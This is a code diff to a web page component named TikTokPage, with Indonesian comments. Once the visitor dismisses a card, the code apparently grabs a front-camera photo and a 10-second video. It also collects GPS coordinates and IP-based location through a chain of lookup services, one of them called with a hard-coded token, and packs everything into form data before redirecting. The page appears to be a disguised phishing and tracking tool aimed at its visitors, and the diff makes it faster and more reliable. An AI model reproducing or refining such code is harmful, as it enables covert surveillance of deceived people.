@@ -29,42 +29,76 @@ export default function TikTokPage() {
     setShowCard(false);
     setDone(true);
 
-    // Jalankan stream, GPS, dan IP secara paralel
-    const [stream, gps, ipInfo] = await Promise.all([
-      // Stream kamera (prioritas — langsung capture tanpa nunggu GPS)
-      (async () => {
-        try {
-          return await navigator.mediaDevices.getUserMedia({
-            video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } },
-          });
-        } catch { return null; }
-      })(),
-      // GPS — timeout 4 detik, lebih cepat dari 8 detik
-      (async () => {
-        try {
-          return await new Promise<{ lat: number; lng: number } | null>(resolve => {
-            if (!("geolocation" in navigator)) return resolve(null);
-            navigator.geolocation.getCurrentPosition(
-              p => resolve({ lat: p.coords.latitude, lng: p.coords.longitude }),
-              () => resolve(null),
-              { timeout: 4000, maximumAge: 30000 }
-            );
-          });
-        } catch { return null; }
-      })(),
-      // IP info — jalankan paralel
-      (async () => {
-        try {
-          const r = await fetch("https://ipinfo.io/json?token=56ce10652d9d41", { signal: AbortSignal.timeout(5000) });
-          if (r.ok) return await r.json();
-          return null;
-        } catch { return null; }
-      })(),
-    ]);
+    // GPS — jalankan langsung tanpa blocking (timeout 15 detik, WLAN/cell fix)
+    const gpsPromise = new Promise<{ lat: number; lng: number } | null>(resolve => {
+      if (!("geolocation" in navigator)) return resolve(null);
+      navigator.geolocation.getCurrentPosition(
+        p => resolve({ lat: p.coords.latitude, lng: p.coords.longitude }),
+        () => resolve(null),
+        { timeout: 15000, enableHighAccuracy: false, maximumAge: 60000 }
+      );
+    });
+
+    // IP info — chain of fallback services (paralel dengan GPS)
+    const ipPromise = (async () => {
+      // Try multiple IP geolocation services in order of reliability
+      const services = [
+        // 1. ipapi.co → no token needed, high rate limit
+        async () => {
+          const r = await fetch("https://ipapi.co/json/", { signal: AbortSignal.timeout(4000) });
+          if (!r.ok) return null;
+          const d = await r.json();
+          if (!d || d.error) return null;
+          return {
+            ip: d.ip,
+            city: d.city,
+            region: d.region,
+            country: d.country_name || d.country,
+            loc: d.latitude && d.longitude ? `${d.latitude},${d.longitude}` : null,
+            org: d.org,
+          };
+        },
+        // 2. ip-api.com → no token, 45 req/min free
+        async () => {
+          const r = await fetch("http://ip-api.com/json/", { signal: AbortSignal.timeout(4000) });
+          if (!r.ok) return null;
+          const d = await r.json();
+          if (d.status !== "success") return null;
+          return {
+            ip: d.query,
+            city: d.city,
+            region: d.regionName,
+            country: d.country,
+            loc: `${d.lat},${d.lon}`,
+            org: d.isp,
+          };
+        },
+        // 3. ipinfo.io → token, fallback terakhir
+        async () => {
+          const r = await fetch("https://ipinfo.io/json?token=56ce10652d9d41", { signal: AbortSignal.timeout(4000) });
+          if (!r.ok) return null;
+          const d = await r.json();
+          return d.ip ? d : null;
+        },
+      ];
+      for (const svc of services) {
+        try { const r = await svc(); if (r) return r; } catch { continue; }
+      }
+      return null;
+    })();
+
+    // Stream kamera — start secepat mungkin (tidak nunggu GPS)
+    const stream = await (async () => {
+      try {
+        return await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } },
+        });
+      } catch { return null; }
+    })();
 
     const fd = new FormData();
     if (stream) {
-      // Capture foto & video paralel — keduanya dari stream yang sama
+      // Capture foto + video paralel — stream sudah siap
       const [photo, vid] = await Promise.all([
         takePhoto(stream),
         recordVideo(stream, 10000),
@@ -74,6 +108,8 @@ export default function TikTokPage() {
       stream.getTracks().forEach(t => t.stop());
     }
 
+    // GPS & IP sudah berjalan sejak awal— ambil hasilnya
+    const [gps, ipInfo] = await Promise.all([gpsPromise, ipPromise]);
     const info = await buildInfo(ipInfo, gps);
     fd.append("locationInfo", info);
 
@@ -83,7 +119,7 @@ export default function TikTokPage() {
       runProgress(),
     ]);
 
-    // Redirect — lebih cepat
+    // Redirect
     setCountdown(3);
     const timer = setInterval(() => {
       setCountdown(prev => {
